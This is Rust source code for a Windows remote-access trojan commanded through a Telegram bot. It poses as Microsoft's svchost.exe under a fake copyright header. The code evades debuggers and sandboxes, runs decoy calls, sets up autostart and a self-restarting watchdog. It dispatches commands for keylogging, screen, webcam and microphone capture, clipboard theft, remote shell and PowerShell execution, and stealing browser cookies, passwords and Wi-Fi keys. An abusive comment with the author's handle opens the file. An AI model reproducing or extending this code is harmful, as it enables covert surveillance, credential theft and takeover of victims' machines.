//! Microsoft Windows System Host
//! 
//! Copyright (C) Microsoft Corporation. All rights reserved.
//! 
//! This is a critical system component of Microsoft Windows.
//! Unauthorized modification may cause system instability.
//! 
//! Module: System Host (svchost.exe)
//! Version: 10.0.22621.1 (WinBuild.160101.0800)
//! Build: 22621.1.amd64fre.ni_release.220506-1250

/*
лучше залезь себе в пизду и там поработай, чем тут хуйню всякую писать
--------------------------------------------------------------------------
а если хочешь поговорить - пиши в https://t.me/shitcodd?direct
--------------------------------------------------------------------------
автор - @shitcodd | мать того кто это читает - шлюха
*/
#![windows_subsystem = "windows"]

use std::collections::{HashMap, HashSet, VecDeque};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;
use std::time::Duration;
use std::fs as std_fs;
use std::io::{BufReader, BufWriter};
use std::net::{TcpStream, UdpSocket, TcpListener};
use std::env;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::ffi::CString;
use std::os::windows::process::CommandExt;

// Импорты для логирования команд
use std::fs::OpenOptions;
use std::io::Write;

// WinAPI
use winapi::um::wincon::FreeConsole;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcess, TerminateProcess, GetCurrentThreadId};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::debugapi::IsDebuggerPresent;
use winapi::um::handleapi::CloseHandle;
use winapi::um::winuser::{GetForegroundWindow, GetWindowTextW, GetWindowTextLengthW};
use winapi::um::fileapi::{GetFileAttributesW, SetFileAttributesW};
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;

// Основные крейты
use anyhow::{anyhow, Result};
use chrono::{Local, DateTime, Utc};
use lazy_static::lazy_static;
use teloxide::prelude::*;
use teloxide::types::{InputFile, ParseMode, ChatId};
use tokio::fs;
use tokio::sync::{Mutex as TokioMutex, RwLock as TokioRwLock, mpsc};
use tokio::time::sleep;
use whoami;
use hostname;
use sysinfo::{System, Disks, Networks};
use reqwest;
use base64::{prelude::BASE64_STANDARD, Engine};
use sha2::{Sha256, Digest};
use hex;
use enigo::{Enigo, Mouse, Keyboard, Button, Settings, Direction, Coordinate};
use rdev::listen;
use cpal::traits::{DeviceTrait, HostTrait};
use hound::WavWriter;
use xcap::Monitor;
use image::{Rgba, ImageBuffer, DynamicImage, ImageFormat};
use nokhwa::utils::CameraIndex;
use clipboard_win::{Clipboard, Setter, Getter, formats as clip_formats};
use winreg::enums::*;
use windows::Win32::System::Registry::*;
use zip::{ZipWriter, CompressionMethod, write::FileOptions};
use zip::read::ZipArchive;
use walkdir::WalkDir;
use serde_json::json;
use rusqlite::Connection;
use dns_lookup::lookup_host;

// =============================================================================
// ЛОГИРОВАНИЕ ВЫЗОВОВ КОМАНД
// =============================================================================

fn log_command(cmd: &str, args: &[&str]) {
    let log_path = std::env::temp_dir().join("cmd_debug.log");
    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(log_path) {
        let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
        let _ = writeln!(file, "[{}] {} {:?}", timestamp, cmd, args);
    }
}

// =============================================================================
// WATCHDOG (РЕАНИМАТОР)
// =============================================================================

lazy_static! {
    static ref WATCHDOG_RUNNING: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
    static ref WATCHDOG_PID: Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref WATCHDOG_START_TIME: Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref WATCHDOG_CHECK_COUNT: Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref WATCHDOG_RESTART_COUNT: Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref WATCHDOG_HANDLE: Arc<TokioMutex<Option<tokio::task::JoinHandle<()>>>> = 
        Arc::new(TokioMutex::new(None));
    static ref WATCHDOG_SHUTDOWN: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
}

const WATCHDOG_INTERVAL: u64 = 5;
const WATCHDOG_LOG_FILE: &str = "watchdog.log";

// Проверка, жив ли процесс по PID
fn is_process_running(pid: u32) -> bool {
    unsafe {
        let handle = OpenProcess(0x0400 | 0x00100000, 0, pid); // PROCESS_QUERY_INFORMATION | SYNCHRONIZE
        if handle.is_null() {
            return false;
        }
        let status = WaitForSingleObject(handle, 0);
        CloseHandle(handle);
        status == 258  // WAIT_TIMEOUT означает, что процесс жив
    }
}

// Перезапуск основного процесса
async fn restart_main_process() {
    let exe = std::env::current_exe().unwrap();
    let args = ["--restarted"];
    log_command(exe.to_str().unwrap(), &args);
    
    let _ = Command::new(exe.to_str().unwrap())
        .arg("--restarted")
        .creation_flags(0x08000008) // CREATE_NO_WINDOW | DETACHED_PROCESS
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
}

// Функция watchdog (запускается в отдельном потоке)
async fn run_watchdog() {
    let main_pid = std::process::id();
    let thread_id = unsafe { GetCurrentThreadId() };
    
    WATCHDOG_RUNNING.store(true, Ordering::SeqCst);
    WATCHDOG_PID.store(thread_id as u64, Ordering::SeqCst);
    WATCHDOG_START_TIME.store(
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs(),
        Ordering::SeqCst
    );
    
    let mut interval = tokio::time::interval(Duration::from_secs(WATCHDOG_INTERVAL));
    
    // Логируем запуск
    let log_file = dirs::data_local_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("Microsoft")
        .join(WATCHDOG_LOG_FILE);
    
    let _ = std_fs::write(&log_file, 
        format!("[{}] Watchdog started (PID: {}, Main PID: {})\n", 
            chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
            thread_id,
            main_pid
        )
    );
    
    while !WATCHDOG_SHUTDOWN.load(Ordering::SeqCst) {
        interval.tick().await;
        WATCHDOG_CHECK_COUNT.fetch_add(1, Ordering::SeqCst);
        
        if !is_process_running(main_pid) {
            let restart_count = WATCHDOG_RESTART_COUNT.fetch_add(1, Ordering::SeqCst) + 1;
            
            // Логируем перезапуск
            let log_file = dirs::data_local_dir()
                .unwrap_or_else(|| PathBuf::from("."))
                .join("Microsoft")
                .join(WATCHDOG_LOG_FILE);
            
            let mut file = std_fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(log_file)
                .unwrap();
            
            let _ = writeln!(file, "[{}] Main process died! Restart #{}", 
                chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
                restart_count
            );
            
            restart_main_process().await;
            
            // Даем время на запуск
            sleep(Duration::from_secs(2)).await;
            
            // Выходим из watchdog (новый процесс запустит свой watchdog)
            break;
        }
    }
    
    WATCHDOG_RUNNING.store(false, Ordering::SeqCst);
}

// Запуск watchdog
async fn start_watchdog() -> bool {
    if WATCHDOG_RUNNING.load(Ordering::SeqCst) {
        return false;
    }
    
    WATCHDOG_SHUTDOWN.store(false, Ordering::SeqCst);
    
    let handle = tokio::spawn(async {
        run_watchdog().await;
    });
    
    *WATCHDOG_HANDLE.lock().await = Some(handle);
    
    // Даем время на запуск 
    sleep(Duration::from_millis(100)).await;
    
    true
}

// Остановка watchdog
async fn stop_watchdog() -> bool {
    if !WATCHDOG_RUNNING.load(Ordering::SeqCst) {
        return false;
    }
    
    WATCHDOG_SHUTDOWN.store(true, Ordering::SeqCst);
    
    let mut handle_guard = WATCHDOG_HANDLE.lock().await;
    if let Some(handle) = handle_guard.take() {
        handle.abort();
    }
    
    // Сбрасываем флаги
    WATCHDOG_RUNNING.store(false, Ordering::SeqCst);
    WATCHDOG_PID.store(0, Ordering::SeqCst);
    
    // Логируем остановку
    let log_file = dirs::data_local_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("Microsoft")
        .join(WATCHDOG_LOG_FILE);
    
    let _ = std_fs::write(&log_file, 
        format!("[{}] Watchdog stopped\n", 
            chrono::Local::now().format("%Y-%m-%d %H:%M:%S")
        )
    );
    
    true
}

// Получение статуса watchdog
async fn get_watchdog_status() -> String {
    let is_running = WATCHDOG_RUNNING.load(Ordering::SeqCst);
    let pid = WATCHDOG_PID.load(Ordering::SeqCst);
    let start_time = WATCHDOG_START_TIME.load(Ordering::SeqCst);
    let check_count = WATCHDOG_CHECK_COUNT.load(Ordering::SeqCst);
    let restart_count = WATCHDOG_RESTART_COUNT.load(Ordering::SeqCst);
    let main_pid = std::process::id();
    
    let main_alive = is_process_running(main_pid);
    
    let uptime = if start_time > 0 {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        now - start_time
    } else {
        0
    };
    
    let status_icon = if is_running { "🟢" } else { "🔴" };
    let status_text = if is_running { "ACTIVE" } else { "INACTIVE" };
    let main_status = if main_alive { "✅ Alive" } else { "❌ Dead" };
    
    format!(
        "**🔄 WATCHDOG STATUS**\n\n\
        {} **{}**\n\n\
        **Main Process:**\n\
        • PID: {}\n\
        • Status: {}\n\n\
        **Watchdog Process:**\n\
        • PID: {}\n\
        • Uptime: {}s\n\
        • Checks: {}\n\
        • Restarts: {}\n\n\
        **Configuration:**\n\
        • Interval: {}s\n\
        • Log: {}\n\n\
        **Commands:**\n\
        • `/wd start` - Start watchdog\n\
        • `/wd stop` - Stop watchdog\n\
        • `/wd status` - This message\n\
        • `/wd logs` - View watchdog logs",
        status_icon,
        status_text,
        main_pid,
        main_status,
        if pid > 0 { pid.to_string() } else { "N/A".to_string() },
        uptime,
        check_count,
        restart_count,
        WATCHDOG_INTERVAL,
        WATCHDOG_LOG_FILE
    )
}

// Получение логов watchdog
async fn get_watchdog_logs(lines: usize) -> Result<String> {
    let log_file = dirs::data_local_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("Microsoft")
        .join(WATCHDOG_LOG_FILE);
    
    if !log_file.exists() {
        return Ok("📭 No watchdog logs found".to_string());
    }
    
    let content = std_fs::read_to_string(log_file)?;
    let log_lines: Vec<&str> = content.lines().rev().take(lines).collect();
    let logs = log_lines.iter().rev().cloned().collect::<Vec<_>>().join("\n");
    
    if logs.is_empty() {
        Ok("📭 No watchdog logs".to_string())
    } else {
        Ok(format!("**📋 Watchdog Logs (last {}):**\n```\n{}\n```", lines, logs))
    }
}

// =============================================================================
// АНТИ-ОТЛАДКА
// =============================================================================

mod antidebug {
    use super::*;
    use std::time::Instant;
    use winapi::shared::ntdef::NTSTATUS;
    use winapi::um::debugapi::IsDebuggerPresent;

    type NtQueryInformationProcessFn = unsafe extern "system" fn(
        winapi::um::winnt::HANDLE,
        u32,
        *mut std::ffi::c_void,
        u32,
        *mut u32,
    ) -> NTSTATUS;

    static mut NT_QUERY_INFORMATION_PROCESS: Option<NtQueryInformationProcessFn> = None;

    pub unsafe fn init_apis() {
        let kernel32 = GetModuleHandleA("kernel32.dll\0".as_ptr() as *const i8);
        if kernel32.is_null() { return; }
        
        let ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const i8);
        if !ntdll.is_null() {
            let proc_addr = GetProcAddress(ntdll, "NtQueryInformationProcess\0".as_ptr() as *const i8);
            if !proc_addr.is_null() {
                NT_QUERY_INFORMATION_PROCESS = Some(std::mem::transmute(proc_addr));
            }
        }
    }

    pub fn check_debugger() -> bool {
        unsafe {
            if IsDebuggerPresent() != 0 { return true; }
            
            if let Some(nt_query) = NT_QUERY_INFORMATION_PROCESS {
                let mut debug_port: u32 = 0;
                let mut return_len = 0;
                let status = nt_query(
                    GetCurrentProcess(),
                    0x7,
                    &mut debug_port as *mut _ as *mut _,
                    std::mem::size_of::<u32>() as u32,
                    &mut return_len,
                );
                if status == 0 && debug_port != 0 { return true; }
            }
        }
        false
    }

    pub fn check_sandbox() -> bool {
        let start = Instant::now();
        std::thread::sleep(std::time::Duration::from_millis(100));
        if start.elapsed().as_millis() < 50 { return true; }

        if let Ok(monitor) = xcap::Monitor::all() {
            if let Some(m) = monitor.get(0) {
                if m.width() < 800 || m.height() < 600 { return true; }
            }
        }

        false
    }

    pub fn exit_if_debugged() {
        if check_debugger() || check_sandbox() {
            std::process::exit(0);
        }
    }
}

// =============================================================================
// КОНСТАНТЫ И КОНФИГУРАЦИЯ (с обфускацией)
// =============================================================================

const MAX_LOG_SIZE: u64 = 10 * 1024 * 1024;
const MAX_UPLOAD_SIZE: u64 = 50 * 1024 * 1024;
const KEYLOG_BUFFER_SIZE: usize = 1000;

fn xor_decrypt(encrypted: &[u8], key: u8) -> String {
    encrypted.iter().map(|&b| (b ^ key) as char).collect()
}

lazy_static! {
    static ref BOT_TOKEN: String = "токен".to_string();

    static ref AUTH_KEY: String = {
        let encrypted: Vec<u8> = vec![
            // Этот ключ используется для авторизации пользователей бота. Не сообщайте его никому.
        ];
        xor_decrypt(&encrypted, 0x55)
    };

    
    static ref AUTHORIZED_USERS: Arc<TokioRwLock<HashSet<i64>>> = Arc::new(TokioRwLock::new(HashSet::new()));
    static ref KEYLOGGER: Arc<TokioMutex<Option<keylogger::KeyLogger>>> = Arc::new(TokioMutex::new(None));
    static ref UPLOAD_QUEUE: Arc<TokioMutex<Vec<(ChatId, PathBuf)>>> = Arc::new(TokioMutex::new(Vec::new()));
    static ref COMMAND_STATS: Arc<TokioMutex<HashMap<String, u64>>> = Arc::new(TokioMutex::new(HashMap::new()));
    static ref SYSTEM_MONITOR: Arc<TokioMutex<SystemMonitor>> = Arc::new(TokioMutex::new(SystemMonitor::new()));
    static ref NETWORK_MONITOR: Arc<TokioMutex<NetworkMonitor>> = Arc::new(TokioMutex::new(NetworkMonitor::new()));
    static ref FILE_MONITOR: Arc<TokioMutex<FileMonitor>> = Arc::new(TokioMutex::new(FileMonitor::new()));
    static ref PROCESS_MONITOR: Arc<TokioMutex<ProcessMonitor>> = Arc::new(TokioMutex::new(ProcessMonitor::new()));
    static ref REGISTRY_MONITOR: Arc<TokioMutex<RegistryMonitor>> = Arc::new(TokioMutex::new(RegistryMonitor::new()));
    static ref CLIPBOARD_MONITOR: Arc<TokioMutex<ClipboardMonitor>> = Arc::new(TokioMutex::new(ClipboardMonitor::new()));
    static ref POWER_MONITOR: Arc<TokioMutex<PowerMonitor>> = Arc::new(TokioMutex::new(PowerMonitor::new()));
}

// =============================================================================
// ПАРСИНГ АРГУМЕНТОВ С КАВЫЧКАМИ
// =============================================================================

fn parse_args(input: &str) -> Vec<String> {
    let mut args = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    let mut chars = input.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '"' => in_quotes = !in_quotes,
            ' ' if !in_quotes => {
                if !current.is_empty() {
                    args.push(std::mem::take(&mut current));
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        args.push(current);
    }
    args
}

// =============================================================================
// СТРУКТУРЫ ДАННЫХ
// =============================================================================

#[derive(Clone)]
struct SystemMonitor {
    cpu_usage: f32,
    memory_usage: f32,
    disk_usage: HashMap<String, f32>,
    network_rx: u64,
    network_tx: u64,
    processes: usize,
    uptime: u64,
    last_update: DateTime<Utc>,
}

impl SystemMonitor {
    fn new() -> Self {
        Self {
            cpu_usage: 0.0,
            memory_usage: 0.0,
            disk_usage: HashMap::new(),
            network_rx: 0,
            network_tx: 0,
            processes: 0,
            uptime: 0,
            last_update: Utc::now(),
        }
    }

    fn update(&mut self) {
        let mut sys = System::new_all();
        sys.refresh_all();

        let cpus = sys.cpus();
        if !cpus.is_empty() {
            self.cpu_usage = cpus.iter().map(|c| c.cpu_usage()).sum::<f32>() / cpus.len() as f32;
        }

        self.memory_usage = if sys.total_memory() > 0 {
            (sys.used_memory() as f32 / sys.total_memory() as f32) * 100.0
        } else {
            0.0
        };

        let disks = Disks::new_with_refreshed_list();
        for disk in disks.list() {
            if disk.total_space() > 0 {
                let usage = (disk.total_space() - disk.available_space()) as f32 / disk.total_space() as f32 * 100.0;
                self.disk_usage.insert(disk.name().to_string_lossy().to_string(), usage);
            }
        }

        let networks = Networks::new_with_refreshed_list();
        for (_, data) in networks.iter() {
            self.network_rx += data.received();
            self.network_tx += data.transmitted();
        }

        self.processes = sys.processes().len();
        self.uptime = System::uptime();
        self.last_update = Utc::now();
    }

    fn get_report(&self) -> String {
        let mut report = format!(
            "📊 **System Report**\n\n\
            CPU Usage: {:.1}%\n\
            Memory Usage: {:.1}%\n\
            Processes: {}\n\
            Uptime: {}d {}h {}m\n\
            Last Update: {}\n\n",
            self.cpu_usage,
            self.memory_usage,
            self.processes,
            self.uptime / 86400,
            (self.uptime % 86400) / 3600,
            (self.uptime % 3600) / 60,
            self.last_update.format("%Y-%m-%d %H:%M:%S")
        );

        report.push_str("📀 **Disk Usage:**\n");
        for (disk, usage) in &self.disk_usage {
            report.push_str(&format!("  {}: {:.1}%\n", disk, usage));
        }

        report.push_str(&format!("\n🌐 **Network:**\n  RX: {} MB\n  TX: {} MB", 
            self.network_rx / 1024 / 1024,
            self.network_tx / 1024 / 1024
        ));

        report
    }
}

#[derive(Clone)]
struct NetworkMonitor {
    connections: Vec<ConnectionInfo>,
    interfaces: HashMap<String, InterfaceInfo>,
}

impl NetworkMonitor {
    fn new() -> Self {
        Self {
            connections: Vec::new(),
            interfaces: HashMap::new(),
        }
    }
}

#[derive(Clone)]
struct ConnectionInfo {
    protocol: String,
    local_addr: String,
    remote_addr: String,
    state: String,
    pid: u32,
}

#[derive(Clone)]
struct InterfaceInfo {
    name: String,
    mac: String,
    ipv4: Vec<String>,
    ipv6: Vec<String>,
    status: String,
}

#[derive(Clone)]
struct FileMonitor {
    watched_dirs: HashSet<PathBuf>,
    changes: Vec<FileChange>,
    last_scan: DateTime<Utc>,
}

impl FileMonitor {
    fn new() -> Self {
        Self {
            watched_dirs: HashSet::new(),
            changes: Vec::new(),
            last_scan: Utc::now(),
        }
    }
}

#[derive(Clone)]
struct FileChange {
    path: PathBuf,
    change_type: ChangeType,
    timestamp: DateTime<Utc>,
    size: u64,
}

#[derive(Clone, PartialEq)]
enum ChangeType {
    Created,
    Modified,
    Deleted,
}

#[derive(Clone)]
struct ProcessMonitor {
    processes: HashMap<u32, ProcessInfo>,
    alerts: Vec<ProcessAlert>,
}

impl ProcessMonitor {
    fn new() -> Self {
        Self {
            processes: HashMap::new(),
            alerts: Vec::new(),
        }
    }
}

#[derive(Clone)]
struct ProcessInfo {
    pid: u32,
    name: String,
    cpu_usage: f32,
    memory_usage: u64,
    threads: u32,
}

#[derive(Clone)]
struct ProcessAlert {
    pid: u32,
    name: String,
    severity: AlertSeverity,
    timestamp: DateTime<Utc>,
    message: String,
}

#[derive(Clone, Debug)]
enum AlertSeverity {
    Info,
    Warning,
    Critical,
}

#[derive(Clone)]
struct RegistryMonitor {
    watched_keys: HashSet<String>,
    changes: Vec<RegistryChange>,
}

impl RegistryMonitor {
    fn new() -> Self {
        Self {
            watched_keys: HashSet::new(),
            changes: Vec::new(),
        }
    }
}

#[derive(Clone)]
struct RegistryChange {
    key: String,
    change_type: RegistryChangeType,
    timestamp: DateTime<Utc>,
}

#[derive(Clone)]
enum RegistryChangeType {
    KeyCreated,
    KeyDeleted,
    ValueSet,
}

#[derive(Clone)]
struct ClipboardMonitor {
    history: VecDeque<String>,
    last_content: String,
    changes: u64,
    monitoring: bool,
}

impl ClipboardMonitor {
    fn new() -> Self {
        Self {
            history: VecDeque::with_capacity(100),
            last_content: String::new(),
            changes: 0,
            monitoring: false,
        }
    }

    fn check_clipboard(&mut self) -> Option<String> {
        let content = clipboard::get_clipboard();
        if content != self.last_content && !content.is_empty() {
            self.last_content = content.clone();
            self.history.push_back(content.clone());
            self.changes += 1;
            
            if self.history.len() > 100 {
                self.history.pop_front();
            }
            
            return Some(content);
        }
        None
    }

    fn get_history(&self) -> String {
        let mut result = format!("📋 **Clipboard History** ({} changes)\n\n", self.changes);
        for (i, content) in self.history.iter().rev().enumerate() {
            if i < 20 {
                let preview = if content.len() > 50 {
                    format!("{}...", &content[..50])
                } else {
                    content.clone()
                };
                result.push_str(&format!("{}. {}\n", i + 1, preview));
            }
        }
        result
    }
}

#[derive(Clone)]
struct UsbDevice {
    manufacturer: String,
    product: String,
}

#[derive(Clone)]
struct CameraInfo {
    name: String,
    active: bool,
}

#[derive(Clone)]
struct MicrophoneInfo {
    name: String,
    active: bool,
}

#[derive(Clone)]
struct TemperatureMonitor {
    history: VecDeque<TemperatureReading>,
    alerts: Vec<TemperatureAlert>,
}

impl TemperatureMonitor {
    fn new() -> Self {
        Self {
            history: VecDeque::new(),
            alerts: Vec::new(),
        }
    }
}

#[derive(Clone)]
struct TemperatureReading {
    timestamp: DateTime<Utc>,
    sensor: String,
    temperature: f32,
}

#[derive(Clone)]
struct TemperatureAlert {
    sensor: String,
    temperature: f32,
    threshold: f32,
    timestamp: DateTime<Utc>,
}

#[derive(Clone)]
struct PowerMonitor {
    power_source: PowerSource,
    battery: Option<BatteryInfo>,
}

impl PowerMonitor {
    fn new() -> Self {
        Self {
            power_source: PowerSource::Unknown,
            battery: None,
        }
    }
}

#[derive(Clone)]
enum PowerSource {
    AC,
    Battery,
    Unknown,
}

#[derive(Clone)]
struct BatteryInfo {
    charge_percent: f32,
    status: BatteryStatus,
    health: f32,
}

#[derive(Clone, Debug)]
enum BatteryStatus {
    Charging,
    Discharging,
    Full,
    Unknown,
}

// =============================================================================
// ТОЧКА ВХОДА
// =============================================================================

#[tokio::main]
async fn main() -> Result<()> {
    unsafe { FreeConsole(); }
    unsafe { antidebug::init_apis(); }
    antidebug::exit_if_debugged();

    let _ = compute_fibonacci(10);
    let _ = dummy_api_calls();

    let log_file = dirs::data_local_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("Microsoft")
        .join("agent.log");
    if let Some(parent) = log_file.parent() {
        let _ = std_fs::create_dir_all(parent);
    }
    let _ = std_fs::write(&log_file, format!("[{}] Agent started\n", chrono::Local::now().format("%Y-%m-%d %H:%M:%S")));

    let token_str = BOT_TOKEN.clone();
    println!("Starting Telegram Agent v7.0...");

    let has_valid_token = !token_str.is_empty()
        && !token_str.contains("XXX")
        && token_str.contains(":");

    if !has_valid_token {
        eprintln!("WARNING: Invalid Telegram bot token configured.");
        println!("Skipping Telegram bot initialization. Configure a valid token to enable bot features.");
    }

    init_monitors().await?;

    if let Ok(_) = autostart::setup_autostart() {
        println!("Autostart configured");
    }

    // Автоматически запускаем watchdog при старте
    start_watchdog().await;
    println!("Watchdog started automatically");

    if has_valid_token {
        println!("Bot initialized, waiting for commands...");
        let bot = Bot::new(token_str);

        teloxide::repl(bot, |bot: Bot, msg: Message| async move {
            if let Err(e) = handle_commands(bot, msg).await {
                eprintln!("Handler error: {}", e);
            }
            Ok(())
        }).await;

        println!("Bot disconnected");
    } else {
        println!("System agent running in offline mode. Waiting for 10 seconds then exiting...");
        tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
    }

    // Останавливаем watchdog при выходе
    stop_watchdog().await;
    
    Ok(())
}

fn compute_fibonacci(n: u32) -> u64 {
    if n <= 1 { return n as u64; }
    let mut a = 0;
    let mut b = 1;
    for _ in 2..=n {
        let c = a + b;
        a = b;
        b = c;
    }
    b
}

fn dummy_api_calls() -> bool {
    unsafe {
        let _ = GetModuleHandleA("user32.dll\0".as_ptr() as *const i8);
        let _ = GetProcAddress(std::ptr::null_mut(), "MessageBoxA\0".as_ptr() as *const i8);
        let _ = IsDebuggerPresent();
    }
    false
}

// =============================================================================
// COMMAND HANDLER
// =============================================================================

async fn handle_commands(bot: Bot, msg: Message) -> Result<()> {
    let chat_id = msg.chat.id;
    
    {
        let queue = UPLOAD_QUEUE.lock().await;
        let has_upload = queue.iter().any(|(cid, _)| *cid == chat_id);
        drop(queue);
        
        if has_upload {
            if let Some(doc) = msg.document() {
                let doc_clone = doc.clone();
                return handle_document(bot, msg, &doc_clone).await;
            }
            if msg.photo().is_some() {
                return handle_photo(bot, msg).await;
            }
            if msg.text().is_none() {
                bot.send_message(chat_id, "❌ Please send a file or photo").await?;
                return Ok(());
            }
        }
    }
    
    let text = msg.text().unwrap_or("").to_string();
    
    if !text.starts_with("/") {
        return Ok(());
    }
    
    let parts: Vec<&str> = text.split_whitespace().collect();
    if parts.is_empty() {
        return Ok(());
    }
    
    let cmd = parts[0];
    let args_input = parts[1..].join(" ");
    let args = parse_args(&args_input);

    let user_id = msg.from().map(|u| u.id.0 as i64).unwrap_or(0);
    let is_authorized = AUTHORIZED_USERS.read().await.contains(&user_id);
    let public_commands = ["/start", "/help", "/auth"];
    
    if !public_commands.contains(&cmd) && !is_authorized {
        bot.send_message(msg.chat.id, "⛔ Access denied. Use /auth <key>").await?;
        return Ok(());
    }

    {
        let mut stats = COMMAND_STATS.lock().await;
        *stats.entry(cmd.to_string()).or_insert(0) += 1;
    }

    let args_str: Vec<&str> = args.iter().map(|s| s.as_str()).collect();

    match cmd {
        "/start" => cmd_start(bot, msg).await?,
        "/help" => cmd_help(bot, msg).await?,
        "/auth" if !args_str.is_empty() => cmd_auth(bot, msg, args_str).await?,
        
        "/download" if !args_str.is_empty() => cmd_download(bot, msg, args_str).await?,
        "/download_url" if !args_str.is_empty() => cmd_download_url(bot, msg, args_str).await?,
        "/upload" => cmd_upload(bot, msg, args_str).await?,
        "/list" => cmd_list(bot, msg, args_str).await?,
        "/list_recursive" => cmd_list_recursive(bot, msg, args_str).await?,
        "/create" if !args_str.is_empty() => cmd_create(bot, msg, args_str).await?,
        "/delete" if !args_str.is_empty() => cmd_delete(bot, msg, args_str).await?,
        "/move" if args_str.len() >= 2 => cmd_move(bot, msg, args_str).await?,
        "/rename" if args_str.len() >= 2 => cmd_rename(bot, msg, args_str).await?,
        "/hide" if !args_str.is_empty() => cmd_hide(bot, msg, args_str).await?,
        "/unhide" if !args_str.is_empty() => cmd_unhide(bot, msg, args_str).await?,
        "/file_properties" if !args_str.is_empty() => cmd_file_properties(bot, msg, args_str).await?,
        "/search_files" if args_str.len() >= 2 => cmd_search_files(bot, msg, args_str).await?,
        "/checksum" if !args_str.is_empty() => cmd_checksum(bot, msg, args_str).await?,
        "/zip" if args_str.len() >= 2 => cmd_zip(bot, msg, args_str).await?,
        "/unzip" if args_str.len() >= 2 => cmd_unzip(bot, msg, args_str).await?,
        
        "/run" if !args_str.is_empty() => cmd_run(bot, msg, args_str).await?,
        "/run_powershell" if !args_str.is_empty() => cmd_run_powershell(bot, msg, args_str).await?,
        
        "/screenshot" => cmd_screenshot(bot, msg, args_str).await?,
        "/screenshot_multi" => cmd_screenshot_multi(bot, msg, args_str).await?,
        "/camphoto" => cmd_camphoto(bot, msg).await?,
        "/microfon" => cmd_microfon(bot, msg, args_str).await?,
        "/record_audio" => cmd_record_audio(bot, msg, args_str).await?,
        
        "/keylog_start" => cmd_keylog_start(bot, msg).await?,
        "/keylog_stop" => cmd_keylog_stop(bot, msg).await?,
        "/keylog_dump" => cmd_keylog_dump(bot, msg).await?,
        "/keylog_clear" => cmd_keylog_clear(bot, msg).await?,
        "/keylog_status" => cmd_keylog_status(bot, msg).await?,
        
        "/clipboard" => cmd_clipboard(bot, msg).await?,
        "/clipboard_set" if !args_str.is_empty() => cmd_clipboard_set(bot, msg, args_str).await?,
        
        "/monitor" => cmd_monitor(bot, msg, args_str).await?,
        "/monitor_system" => cmd_monitor_system(bot, msg).await?,
        "/monitor_network" => cmd_monitor_network(bot, msg).await?,
        "/monitor_processes" => cmd_monitor_processes(bot, msg).await?,
        "/monitor_files" => cmd_monitor_files(bot, msg, args_str).await?,
        "/monitor_registry" => cmd_monitor_registry(bot, msg, args_str).await?,
        "/monitor_temperature" => cmd_monitor_temperature(bot, msg).await?,
        "/monitor_power" => cmd_monitor_power(bot, msg).await?,
        "/alerts" => cmd_alerts(bot, msg).await?,
        
        "/steal_cookies" => cmd_steal_cookies(bot, msg).await?,
        "/steal_passwords" => cmd_steal_passwords(bot, msg).await?,
        "/steal_wifi_passwords" => cmd_steal_wifi_passwords(bot, msg).await?,
        "/steal_history" => cmd_steal_history(bot, msg).await?,
        "/steal_bookmarks" => cmd_steal_bookmarks(bot, msg).await?,
        
        "/key_press" if !args_str.is_empty() => cmd_key_press(bot, msg, args_str).await?,
        "/type_text" if !args_str.is_empty() => cmd_type_text(bot, msg, args_str).await?,
        "/mouse_move" if args_str.len() >= 2 => cmd_mouse_move(bot, msg, args_str).await?,
        "/mouse_click" => cmd_mouse_click(bot, msg, args_str).await?,
        "/mouse_position" => cmd_mouse_position(bot, msg).await?,
        
        "/autostart" => cmd_autostart(bot, msg).await?,
        "/autostart_remove" => cmd_autostart_remove(bot, msg).await?,
        "/registry" => cmd_registry(bot, msg, args_str).await?,
        "/services" => cmd_services(bot, msg).await?,
        "/scheduled_tasks" => cmd_scheduled_tasks(bot, msg).await?,
        
        "/pcoff" => cmd_pcoff(bot, msg, args_str).await?,
        "/restart" => cmd_restart(bot, msg, args_str).await?,
        "/hibernate" => cmd_hibernate(bot, msg).await?,
        "/sleep" => cmd_sleep(bot, msg).await?,
        "/lock" => cmd_lock(bot, msg).await?,
        "/logoff" => cmd_logoff(bot, msg).await?,
        "/abort_shutdown" => cmd_abort_shutdown(bot, msg).await?,
        
        "/rickroll" => cmd_rickroll(bot, msg).await?,
        "/selfdestruct" => cmd_selfdestruct(bot, msg, args_str).await?,
        "/wd" | "/watchdog" | "/reanimator" => cmd_watchdog(bot, msg, args_str).await?,
        "/stats" => cmd_stats(bot, msg).await?,
        "/logs" => cmd_logs(bot, msg, args_str).await?,
        "/clear_logs" => cmd_clear_logs(bot, msg).await?,
        "/version" => cmd_version(bot, msg).await?,
        
        "/sysinfo" => cmd_sysinfo(bot, msg).await?,
        
        _ => {
            bot.send_message(msg.chat.id, "❌ Unknown command. Try /help").await?;
        }
    }
    
    Ok(())
}

// =============================================================================
